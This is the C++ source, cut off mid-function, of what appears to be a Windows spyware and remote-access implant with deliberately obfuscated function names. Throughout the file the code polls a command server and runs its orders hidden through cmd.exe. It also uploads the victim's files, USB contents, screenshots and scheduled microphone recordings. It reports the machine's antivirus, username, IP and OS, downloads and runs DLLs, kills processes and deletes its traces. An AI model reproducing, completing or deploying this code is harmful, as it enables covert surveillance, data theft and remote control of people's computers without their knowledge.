
#include "SI.h"
#include "SR.h"
#include "RC.h"
#include "stdafx.h"
#include <windows.h>
#include <string>
#include<iostream>
#include "dirent.h"

#define CURL_STATICLIB
#include "curl\curl.h"
#include<vector>
#include<conio.h>
#include <sstream>
#include"simple.h"
#include <direct.h>
#pragma comment ( lib, "winmm.lib" )
#pragma comment(lib, "Advapi32.lib")
#include <algorithm> 
#include <thread> 
#include <wininet.h>
#include<ctime>
#include <fstream>
#include <wbemidl.h>
#include <atlbase.h>

#pragma comment(lib,"wbemuuid")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wldap32.lib")

#ifdef _DEBUG
#pragma comment(lib, "libcurl_a_debug.lib")
#else
#pragma comment(lib, "libcurl_a.lib")
#endif
using namespace std;


struct FtpFile
{
	const char *filename;
	FILE *stream;
};

int line = 0;
string var;
std::string OS;
std::string jhrthjtklhrtertet;
std::string GLB_URL;
std::string datas;
std::string JHFGJFGHGFGHFGGHFDJGH;

size_t writeCallback(char* buf, size_t size, size_t nmemb, void* up)
{
	for (int c = 0; c < size*nmemb; c++)
	{
		datas.push_back(buf[c]);
	}
	return size*nmemb; //tell curl how many bytes we handled
}


size_t my_dummy_write(char *ptr, size_t size, size_t nmemb, void *userdata)
{
	return size * nmemb;
}

class  WinServices
{
private:

	std::string HN;
	int counts = 0;
	std::string IP;
	int COUNTCMD;
	string DL_PTH;
	std::string downloadpath;
	string Recieved_cmd;
	int datestatus;
	string PTH_Mp3;
	string cmds[7];
	string cmd[7];
	string times[20];
	const char*Temppath;
	string SI_PATH;
	string UsrName;
	string LF;
	string CLIENTSF;
	string TL_PTH;
	std::string Username;
	std::string AVINSLLD;
	std::string pstdata;
	std::string FileVersion;
	bool Fileexist;

public:

	string SV1_AD;
	string pqwpqfdgdshg;
	std::string MA;
	string Chunk[7];
	string DB;
	string pcfile_path;
	string windowold;
	string windowlatest;
	string printer;
	std::string Drives;


	WinServices::WinServices()
	{
		MA = "";
		HN = "";
		IP = "";
		datestatus = 1;
	}

	void ffffffghhhjkjkkkkk()
	{
		try
		{
			datestatus = 1;

			ifstream ifiles(jhrthjtklhrtertet + "Mnwin32.txt");
			if (ifiles)
			{
				remove((jhrthjtklhrtertet + "Mnwin32.txt").c_str());
				ifiles.close();
			}
			ifiles.close();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	WinServices::~WinServices()
	{
	}

	void CreateYFiles()
	{
		string str1 = "Public";
		string str2 = "NonPublic";
		string str3 = "Downloads";
		string str4 = "PackagesWin36";
		string str5 = "C:\\";
		string str6 = "TempDir";
		string str7 = "Users";
		string str8 = "ProgramData";
		string str11 = "Music";
		string str12 = "Roaming";
		string catHic = str1 + "\\" + str6;

		const std::string str9 = str5 + str7 + "\\" + catHic + "\\";
		const char* cstr = str9.c_str();
		_mkdir(cstr);


		PTH_Mp3 = str9 + "randomadress.txt";
		FileVersion = str9 + "version.txt";
		SI_PATH = str9 + "windowssi.txt";
		LF = str5 + str8 + "\\" + "cookies.txt";
		TL_PTH = str9 + "windowstaskl.txt";
		CLIENTSF = str9 + "customcmd.txt";
	}

	void khkhkhkhsdferweqrwr(std::string Mac_address, std::string server_path, std::string appdata)
	{
		string url = server_path + "menu.php" + "?mac=" + Mac_address;
		CURL *curl;
		CURLcode res;
		curl_global_init(CURL_GLOBAL_ALL);
		curl = curl_easy_init();
		if (curl)
		{
			curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &writeCallback);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //tell curl to output its progress
			CURLcode res = curl_easy_perform(curl);
			if (res != CURLE_OK)
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
			curl_easy_cleanup(curl);
		}

		ofstream myfile;
		myfile.open(appdata + "Mnwin32.txt");
		myfile << datas;
		myfile.close();
		curl_global_cleanup();
		datas = "";
	}

	std::string mjhytgfr() 
	{
		std::string antiVirus = "NULL";
		try
		{
			CoInitializeEx(0, 0);
			CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
			IWbemLocator *locator = 0;
			CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void **)&locator);
			IWbemServices * services = 0;
			wchar_t *name = L"root\\SecurityCenter2";
			if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
				printf("Connected!\n");
				//Lets get system information
				CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
				wchar_t *query = L"Select * From AntiVirusProduct";
				IEnumWbemClassObject *e = 0;
				if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
					printf("Query executed successfuly!\n");
					IWbemClassObject *object = 0;
					ULONG u = 0;
					//lets enumerate all data from this table
					while (e) {
						e->Next(WBEM_INFINITE, 1, &object, &u);
						if (!u) break;//no more data,end enumeration
						CComVariant cvtVersion;
						object->Get(L"displayName", 0, &cvtVersion, 0, 0);
						wcout << cvtVersion.bstrVal << endl;
						antiVirus = CW2A(cvtVersion.bstrVal);
					}
				}
				else
					printf("Error executing query!\n");
			}
			else
				printf("Connection error!\n");
			//Close all used data
			services->Release();
			locator->Release();
			CoUninitialize();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
		return antiVirus;
	}


	bool yhnbgt(const char* directory)
	{
		try
		{
			if (strcmp(directory, "..") == 0 || strcmp(directory, ".") == 0)
				return true;
			else
				return false;
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}


	bool plkiujhyaszxcdfvbghn(const std::string& fileName, const std::string& path, std::string resultPath, std::string extension, int isnotupload)
	{
		try
		{
			string lowercase = extension;
			transform(lowercase.begin(), lowercase.end(), lowercase.begin(), tolower);

			string uppercase = extension;
			transform(uppercase.begin(), uppercase.end(), uppercase.begin(), toupper);
			dirent* entry;
			DIR* dir = opendir(path.c_str());

			if (dir == NULL)
				return false;

			while ((entry = readdir(dir)) != NULL)
			{
				try
				{
					if (entry->d_type == DT_REG)
					{
						resultPath = path + "\\" + entry->d_name;

						if (extension == "*")
						{
							if (!isnotupload)
							{
								if (path == "C:\\ProgramData\\Temp\\") //usb check
								{
									bgtrfvcdewsx(resultPath, "1");
								}

								else
								{
									bgtrfvcdewsx(resultPath, "0");
								}
							}
							else
							{
								RequestFiles(resultPath);
							}
						}
						else
						{
							if (resultPath.rfind(lowercase) == (resultPath.size() - lowercase.size()) || resultPath.rfind(extension) == (resultPath.size() - extension.size()) || resultPath.rfind(uppercase) == (resultPath.size() - uppercase.size()))
							{
								if (!isnotupload)
								{
									if (path == jhrthjtklhrtertet + "usb\\")
									{
										bgtrfvcdewsx(resultPath, "1");
									}

									else
									{
										bgtrfvcdewsx(resultPath, "0");
									}
								}
								else
								{
									RequestFiles(resultPath);
								}
							}
						}
						if (fileName.compare(entry->d_name) == 0)
						{
							resultPath = path + "\\" + entry->d_name;
							closedir(dir);
							return true;
						}
					}
				}
				catch (const std::overflow_error& e)
				{
					cout << e.what() << endl;
				}
			}
			rewinddir(dir);
			while ((entry = readdir(dir)) != NULL)
			{
				if (entry->d_type == DT_DIR)
				{
					if (!yhnbgt(entry->d_name))
					{
						std::string nextDirectoryPath = path + "\\" + entry->d_name;
						try
						{
							bool result = plkiujhyaszxcdfvbghn(fileName, nextDirectoryPath, resultPath, extension, isnotupload);

							if (result == true)
							{
								closedir(dir);
								return true;
							}
						}

						catch (const std::overflow_error& e)
						{
							cout << e.what() << endl;
						}
					}
				}
			}
			closedir(dir);
			return false;
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
			return true;
		}
	}

	//*************************************************************************************************

	static size_t my_fwrite(void *buffer, size_t size, size_t nmemb, void *stream)
	{
		struct FtpFile *out = (struct FtpFile *)stream;
		if (out && !out->stream)
		{
			/* open file for writing */
			out->stream = fopen(out->filename, "wb");
			if (!out->stream)
				return -1; /* failure, can't open file to write */
		}
		return fwrite(buffer, size, nmemb, out->stream);
	}

	//********************************************************************************
	void DF(string dllname, int sequence)
	{
		try
		{

			CURL *curl;
			CURLcode res;
			string Url;

			if (sequence == 10 || sequence == 15)
			{
				downloadpath = jhrthjtklhrtertet + dllname;
				Temppath = downloadpath.c_str();
				Url = pqwpqfdgdshg + dllname + "?mac=" + MA;
			}

			else if (sequence == 11)
			{
				downloadpath = jhrthjtklhrtertet + dllname;
				Temppath = downloadpath.c_str();
				Url = SV1_AD + dllname + "?mac=" + MA;
			}

			else if (sequence == 1)
			{
				downloadpath = jhrthjtklhrtertet + dllname;
				Temppath = downloadpath.c_str();
				Url = SV1_AD + dllname + "?mac=" + MA;
			}

			else
			{
				downloadpath = jhrthjtklhrtertet + dllname;
				Temppath = downloadpath.c_str();
				Url = SV1_AD + dllname + "?mac=" + MA;
			}


			struct FtpFile ftpfile =
			{
				Temppath, /* name to store the file as if successful */
				NULL
			};

			curl_global_init(CURL_GLOBAL_DEFAULT);
			curl = curl_easy_init();
			if (curl)
			{
				curl_easy_setopt(curl, CURLOPT_URL, Url.c_str());
				curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, my_fwrite);
				curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ftpfile);
				curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
			//	curl_easy_setopt(curl, CURLOPT_NOBODY, true);
				res = curl_easy_perform(curl);
				curl_easy_cleanup(curl);

				if (CURLE_OK != res)
				{
					/* we failed */
					fprintf(stderr, "curl told us %d\n", res);
				}
			}
			if (ftpfile.stream)
				fclose(ftpfile.stream); /* close the local file */

			curl_global_cleanup();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	bool mnvbvncvvcv(string mac)
	{
		try
		{

			if (Chunk[1] == mac)
			{
				return 1;
			}
			else
			{
				return 0;
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	bool bgtrfvcdewsx(std::string str, string usb_check)
	{
		try
		{

			CURL *curl;
			CURLcode res;
			struct curl_httppost *post = NULL;
			struct curl_httppost *last = NULL;
			curl = curl_easy_init();
			curl = curl_easy_init();
			const char * file = str.c_str();
			if (curl)
			{
				string url = SV1_AD + "UPLD.php" + "?mac=" + var + "&usb=" + usb_check;
				curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				curl_formadd(&post, &last,
					CURLFORM_COPYNAME, "file",
					CURLFORM_FILE, file,
					CURLFORM_END);

				curl_formadd(&post, &last,
					CURLFORM_COPYNAME, "name",
					CURLFORM_COPYCONTENTS, file,
					CURLFORM_END);

				curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
				res = curl_easy_perform(curl);

				if (res)
				{
					return 0;
				}
				curl_formfree(post);
			}
			else
			{
				return 0;
			}
			curl_easy_cleanup(curl);
		}

		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************

	void HTTP_SI()
	{
		try
		{
			CURL *curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_ALL);
			curl = curl_easy_init();

			string url = SV1_AD + "WINDOWSSI.php" + "?mac=" + MA;

			if (curl)
			{
				curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				std::string strs = "mac=" + MA + "&ip=" + IP + "&host=" + HN + "&fileloc=" + Drives + "&AV=" + AVINSLLD + "&Usrnm=" + Username + "&OPS=" + OS;
				const char *postfields = strs.c_str();
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
				CURLcode res = curl_easy_perform(curl);

				if (res != CURLE_OK)
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				curl_easy_cleanup(curl);
			}
			curl_global_cleanup();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	void RequestFiles(string file)
	{
		try
		{
			CURL *curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_ALL);
			curl = curl_easy_init();
			if (curl)
			{
				string url = SV1_AD + "FPTH.php" + "?mac=" + MA;
				curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				std::string pstdata = "path=" + file;
				const char *postfields = pstdata.c_str();
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
				CURLcode res = curl_easy_perform(curl);
				if (res != CURLE_OK)
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				curl_easy_cleanup(curl);
			}
			curl_global_cleanup();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************

	string get_resultofcommandline(std::string versioncmd)
	{
		string temp = "";
		try
		{
			string tempcmd = versioncmd;
			tempcmd = tempcmd + ">" + FileVersion;
			tempcmd = "cmd /c \"" + tempcmd;
			WinExec(tempcmd.c_str(), SW_HIDE);

			Sleep(10000);

			string line;
			ifstream myfile(FileVersion);
			if (myfile.is_open())
			{
				while (getline(myfile, line))
				{
					temp = line;
				}
				myfile.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}

		return temp;
	}

	//************************************************************************************************************
	void mkiussssssssss(const char* folderPath)
	{
		try
		{
			DIR *theFolder = opendir(folderPath);
			struct dirent *next_file;
			char filepath[256];

			while ((next_file = readdir(theFolder)) != NULL)
			{

				sprintf(filepath, "%s/%s", folderPath, next_file->d_name);
				remove(filepath);
			}
			closedir(theFolder);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	void split(const string &s, char delim, vector<string> &elems)
	{
		try
		{
			stringstream ss(s);
			string item;
			while (getline(ss, item, delim))
			{
				elems.push_back(item);
			}
		}
		
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	vector<string> split(const string &s, char delim)
	{
		vector<string> elems;
		split(s, delim, elems);
		return elems;
	}
	//************************************************************************************************************

	void plkiujhyaszxcdfvbghn()
	{
		try
		{

			plkiujhyaszxcdfvbghn("empty", Chunk[1], "empty", Chunk[2], 0);	 
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************


	void Windows_SEND_FP()
	{
		
		try
		{
			plkiujhyaszxcdfvbghn("empty", Chunk[1], "empty", Chunk[2], 1);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void Window_Get_cmd()
	{
		try
		{
			Chunk[1] = Chunk[1] + ">" + SI_PATH;
			Chunk[1] = "cmd.exe /c " + Chunk[1];

			Recieved_cmd = Chunk[0] + "|" + Chunk[1] + "|" + Chunk[2] + "|" + Chunk[3] + "|" + Chunk[4] + "|" + to_string(0);


			try
			{
				WinExec(Chunk[1].c_str(), SW_HIDE);
			}

			catch (std::exception e) {}

			Sleep(20000);
			Windows_Wait_RCMD(SI_PATH);	
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}

	}
	//************************************************************************************************************
	void Windows_CT()
	{
		try
		{
			string command = "tasklist";
			Recieved_cmd = "kqwmn@@&&|" + command + "|" + "NULL|" + "NULL|" + "NULL|" + to_string(0);

			Chunk[1] = command + ">" + TL_PTH;
			Chunk[1] = "cmd /c \"" + Chunk[1];

			try
			{
				WinExec(Chunk[1].c_str(), SW_HIDE);
			}
			catch (std::exception e) {}
	
			Sleep(30000);
			Windows_Wait_TL(TL_PTH);
			remove(Temppath);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	void oioioioioioioio()
	{
		try
		{
			Windows_Wait_RCMD(SI_PATH);
			Windows_Wait_Licnse(LF);
			Windows_Wait_TL(TL_PTH);
			Windows_Wait_CS(CLIENTSF);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	inline bool exist(const std::string& name)
	{
		ifstream file(name);
		if (!file)          
			return false;   
		else                 
			return true;    
	}

	//************************************************************************************************************
	void qwmnerty()
	{
		try
		{
			khkhkhkhsdferweqrwr(MA, SV1_AD, jhrthjtklhrtertet);
			asdfghkhgfdd();
		}

		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void asdfghkhgfdd()
	{
		try
		{
			string line;
			string command;
			ifstream myfile(jhrthjtklhrtertet + "Mnwin32.txt");
			if (myfile.is_open())
			{
				while (getline(myfile, line))
				{
					command = line;
				}
				myfile.close();
			}
			cout << command << '\n';

			std::string cmdmenu[7];
			vector<string> x = split(command, '~');
			COUNTCMD = x.size();
			std::copy(x.begin(), x.end(), cmdmenu);
			Chunk[0] = cmdmenu[0];
			Chunk[1] = cmdmenu[1];
			Chunk[2] = cmdmenu[2];
			Chunk[3] = cmdmenu[3];
			Chunk[4] = cmdmenu[4];
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	
	//************************************************************************************************************
	void jkkkjkjkjkjlkdcx()
	{
		try
		{
			string dllname = "RC.dll";
			int index = 7;
			DF(dllname, index);
			Recieved_cmd = Chunk[0] + "|" + Chunk[1] + "|" + Chunk[2] + "|" + Chunk[3] + "|" + Chunk[4] + "|" + to_string(0);
			GR();
			if (datestatus)
			{		
				ifstream ifile(PTH_Mp3);

				if (ifile)
				{
					bgtrfvcdewsx(PTH_Mp3, "0");
					remove(PTH_Mp3.c_str());
				
				}
				ifile.close();
			}
			remove(Temppath);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************


	std::string real_ip() {

		HINTERNET net = InternetOpen(L"IP retriever",
			INTERNET_OPEN_TYPE_PRECONFIG,
			NULL,
			NULL,
			0);

		HINTERNET conn = InternetOpenUrl(net,
			L"http://myexternalip.com/raw",
			NULL,
			0,
			INTERNET_FLAG_RELOAD,
			0);

		char buffer[4096];
		DWORD read;

		InternetReadFile(conn, buffer, sizeof(buffer) / sizeof(buffer[0]), &read);
		InternetCloseHandle(net);

		return std::string(buffer, read);
	}

	//************************************************************************************************************
	void dggdfgdgdgdgd()
	{
		try
		{
			GetSysteminfo * SI = new GetSysteminfo();
			SI->pc_info(IP, HN, MA, Drives);
			var = MA;
			GLB_URL = SV1_AD;
			Username = GETUSRNME();
			AVINSLLD = mjhytgfr();
			OS = get_resultofcommandline("ver");
			HTTP_SI();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	
	//************************************************************************************************************
	void sfdfsddgghhh()
	{
		try
		{
			cmds[0] = ".jpg";
			cmds[1] = jhrthjtklhrtertet + "screen\\";
			plkiujhyaszxcdfvbghn("NULLS", cmds[1], "NULLS", cmds[0], 0);
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void GET_SS()
	{
		try
		{
			string dir = jhrthjtklhrtertet + "screen";
			_mkdir(dir.c_str());
			int  count = 1;
			int amount_images;
			amount_images = atoi(Chunk[3].c_str());
			SSR * SR = new SSR();
			for (int a = 0; a < amount_images; a++)
			{
				std::string s = std::to_string(count);
				string directory = dir + "\\";
				string path = directory + s + " screenshot.jpg";
				ULONG quality = 500;
				try
				{
					SR->screen(path);
				}
				catch (const std::exception& e)
				{
					cout << e.what() << endl;
				}
				count++;
				
				for (int a = 0; a < 80000; a++)
				{
					cout << "cms user" << endl;
				}

			}
		}		
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void GR()
	{
		try
		{
				string filenames;
				RCDR * RC = new RCDR();

				string dir = jhrthjtklhrtertet + "record\\";
				_mkdir(dir.c_str());
				time_t currentTime;
				struct tm *localTime;
				int REC_MIN;
				REC_MIN = atoi(Chunk[3].c_str());
				int  count = 1;
				while (true)
				{
					time(&currentTime);                  
					localTime = localtime(&currentTime); 
					int Day = localTime->tm_mday;
					int Month = localTime->tm_mon + 1;
					int Year = localTime->tm_year + 1900;
					int Hour = localTime->tm_hour;
					int Min = localTime->tm_min;
					int Sec = localTime->tm_sec;
					string hr, mints;
					hr = std::to_string(Hour);
					string mm, dd, yy;

					if (Month > 0 && Month < 10)
					{
						mm = "0" + std::to_string(Month);
					}
					else
					{
						mm = std::to_string(Month);
					}


					if (Day > 0 && Day < 10)
					{
						dd = "0" + std::to_string(Day);
					}
					else
					{
						dd = std::to_string(Day);
					}

					string date = mm + "/" + dd + "/" + to_string(Year);

					if (date != Chunk[4])
					{
						datestatus = 0;
						break;
					}

					else
					{
						int server_hour = atoi(Chunk[1].c_str());
						int server_min = atoi(Chunk[2].c_str());

						if ((server_hour < Hour) || (Hour == server_hour && server_min < Min))
						{
							datestatus = 0;
							break;
						}

						else
						{
							datestatus = 1;
							if ((Min >= 0 && Min < 10))
							{
								mints = "0" + std::to_string(Min);
							}

							if (Min > 9)
							{
								mints = std::to_string(Min);
							}

							if (Chunk[1] == hr &&  Chunk[2] == mints)
							{

								filenames = dir + "temprecord.mp3";
								try
								{
									RC->SRDING(REC_MIN, filenames);
									break;
								}
								catch (const std::exception& e)
								{
									cout << e.what() << endl;
								}
							}
						}
					}
				}
			PTH_Mp3 = filenames;
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void qwertyuiopasdf()
	{
		try
		{
			time_t currentTime;
			struct tm *localTime;
			time(&currentTime);                   
			localTime = localtime(&currentTime);  
			int Day = localTime->tm_mday;
			int Month = localTime->tm_mon + 1;
			int Year = localTime->tm_year + 1900;
			int Hour = localTime->tm_hour;
			int Min = localTime->tm_min;
			int Sec = localTime->tm_sec;
			string time = std::to_string(Hour) + ":" + std::to_string(Min) + ":" + std::to_string(Sec);
			string date = std::to_string(Year) + "-" + std::to_string(Month) + "-" + std::to_string(Day) + " " + time;

			CURL *curl;
			CURLcode res;
			curl_global_init(CURL_GLOBAL_ALL);
			curl = curl_easy_init();

			if (curl)
			{
				pstdata = "mac=" + MA + "&ip=" + IP + "&host=" + HN + "&datetimepc=" + date + "&version=" + OS;
				string url = SV1_AD + "HIT.php";
				curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
				const char *postfields = pstdata.c_str();
				curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
				CURLcode res = curl_easy_perform(curl);
				if (res != CURLE_OK)
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				curl_easy_cleanup(curl);
			}

			curl_global_cleanup();
			
			for (int a = 0; a < 80000; a++)
			{
				cout << "CMS" << endl;
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void Windows_DAF()
	{
		try
		{
		

			string dllname = Chunk[1];
			int index = 15;
			DF(dllname, index);

			if (Chunk[2] == "null" || Chunk[2] == "NULL")
			{

				string file = jhrthjtklhrtertet+Chunk[1];
				string app = "cmd.exe /c";
				string rslt = app + file;
				WinExec(rslt.c_str(), SW_HIDE);

			}
			else
			{
				string comm = " " + Chunk[2];
				string save = comm + " >" + CLIENTSF;
				string complete_command = jhrthjtklhrtertet + Chunk[1] + save;
				system(complete_command.c_str());

				ifstream ifile(CLIENTSF);

				if (ifile)
				{
					bgtrfvcdewsx(CLIENTSF, "0");
					ifile.close();
					remove(CLIENTSF.c_str());
				}
				else
				{
					ifile.close();
				}
				remove((jhrthjtklhrtertet + Chunk[1]).c_str());
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	void rteryurtrtirtrryooy()
	{
		try
		{
			ifstream ifile(Chunk[1].c_str());

			if (ifile)
			{
				ifile.close();
				remove(Chunk[1].c_str());
			}
			else
			{
				ifile.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void sendremote_connectionstring()
	{
		try
		{

			ifstream ifile(jhrthjtklhrtertet + "constring.txt");
			if (ifile)
			{
				bgtrfvcdewsx(jhrthjtklhrtertet + "constring.txt", "0");
				ifile.close();
			}

			else
			{

				ifile.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void Windows_Wait_RCMD(string arr)
	{
		try
		{
			std::ifstream file(arr);
			std::string str;
			string contentof_file;
			while (std::getline(file, str))
			{
				contentof_file = contentof_file + str;
			}

			if (contentof_file != "")
			{
				bgtrfvcdewsx(SI_PATH, "0");
				file.close();
				remove(SI_PATH.c_str());
			}
			else
			{
				file.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void Windows_Wait_TL(string arr)
	{
		try
		{
			std::ifstream file(arr);
			std::string str;
			string contentof_file;
			while (std::getline(file, str))
			{
				contentof_file = contentof_file + str;
			}

			if (contentof_file != "")
			{
				bgtrfvcdewsx(TL_PTH, "0");
				file.close();
				remove(TL_PTH.c_str());
			}
			else
			{
				file.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//************************************************************************************************************
	void Windows_Wait_CS(string arr)
	{
		try
		{
			std::ifstream file(arr);
			std::string str;
			string contentof_file;
			while (std::getline(file, str))
			{
				contentof_file = contentof_file + str;
			}
			if (contentof_file != "")
			{
				bgtrfvcdewsx(CLIENTSF, "0");
				file.close();
				remove(CLIENTSF.c_str());
			}
			else
			{
				file.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//********************************************************************************************************
	void Windows_Wait_Licnse(string arr)
	{
		try
		{
			std::ifstream file(arr);
			std::string str;
			string contentof_file;
			while (std::getline(file, str))
			{
				contentof_file = contentof_file + str;
			}

			if (contentof_file != "")
			{
				bgtrfvcdewsx(LF, "0");
				file.close();
				remove(LF.c_str());
			}
			else
			{
				file.close();
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//**********************************************************************************************************
	
	string GETUSRNME()
	{
		try
		{
			char acUserName[100];
			wchar_t* wwString = new wchar_t[4096];
			MultiByteToWideChar(CP_ACP, 0, acUserName, -1, wwString, 4096);

			DWORD nUserName = sizeof(acUserName);
			if (GetUserName(wwString, &nUserName))
			{
				std::wstring wide(wwString);
				std::string str(wide.begin(), wide.end());
				UsrName = str;
			}

			return UsrName;
			
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
			return "NULL";
		}
	}
	
	
	void Windows_GV_ASN()
	{
		try
		{	
		jhrthjtklhrtertet = "C:\\Users\\" + GETUSRNME() + "\\AppData\\Roaming\\";
		JHFGJFGHGFGHFGGHFDJGH = "C:\\Users\\" + GETUSRNME();
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}
	//***********************************************************************************************************
	void Windows_KP()
	{
		try
		{
			string str_taskkill = "taskkill /IM " + Chunk[1] + " /F";

			Recieved_cmd = Chunk[0] + "|" + str_taskkill + "|" + Chunk[2] + "|" + Chunk[3] + "|" + Chunk[4] + "|" + to_string(0);

			try
			{

				WinExec(str_taskkill.c_str(), SW_HIDE);
			}
			catch (exception e)
			{
			}
		}
		catch (const std::exception& e)
		{
			cout << e.what() << endl;
		}
	}

	//************************************************************************************************************
	
	
};
//........................................................END CLASS....................................................//


bool bgtrfvcdewsx(std::string str, string usb_check, std::string phpfilename)
{
	try
	{
		CURL *curl;
		CURLcode res;
		struct curl_httppost *post = NULL;
		struct curl_httppost *last = NULL;
		curl = curl_easy_init();
		curl = curl_easy_init();
		const char * file = str.c_str();
		if (curl)
		{
			string url = GLB_URL + phpfilename + "?mac=" + var + "&usb=" + usb_check;

			curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
			curl_formadd(&post, &last,
				CURLFORM_COPYNAME, "file",
				CURLFORM_FILE, file,
				CURLFORM_END);

			curl_formadd(&post, &last,
				CURLFORM_COPYNAME, "name",            
				CURLFORM_COPYCONTENTS, file,
				CURLFORM_END);

			curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
			curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
			res = curl_easy_perform(curl);

			if (res)
			{
				return 0;
			}
			curl_formfree(post);
		}
		else
		{
			return 0;
		}
		curl_easy_cleanup(curl);
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
	}
}

bool yhnbgt(const char* directory)
{
	try
	{
		if (strcmp(directory, "..") == 0 || strcmp(directory, ".") == 0)
			return true;
		else
			return false;
	}
	catch (const std::exception& e)
	{
		cout << e.what() << endl;
	}
}

bool plkiujhyaszxcdfvbghn(const std::string& fileName, const std::string& path, std::string resultPath, std::string extension, int isnotupload)
{
	try
	{
		string uppercase = extension;
		transform(uppercase.begin(), uppercase.end(), uppercase.begin(), toupper);
		dirent* entry;
		DIR* dir = opendir(path.c_str());

		if (dir == NULL)
			return false;
		while ((entry = readdir(dir)) != NULL)
		{
			try
			{
				if (entry->d_type == DT_REG)
				{
					resultPath = path + "\\" + entry->d_name;

					if (extension == "*")
					{
						if (!isnotupload)
						{
							if (path == "C:\\ProgramData\\Temp\\") // usb check 
							{
								try
								{
									bgtrfvcdewsx(resultPath, "1", "UPLD.php");
									remove((resultPath).c_str());
								}

								catch (exception e)
								{
								}
							}
						}
					}
					if (fileName.compare(entry->d_name) == 0)
					{
						resultPath = path + "\\" + entry->d_name;
						closedir(dir);
						return true;
					}
				}
			}
			catch (const std::overflow_error& e)
			{
				cout << e.what() << endl;
			}
		}
		rewinddir(dir);
		while ((entry = readdir(dir)) != NULL)
		{
			if (entry->d_type == DT_DIR)
			{
				if (!yhnbgt(entry->d_name))
				{
					std::string nextDirectoryPath = path + "\\" + entry->d_name;
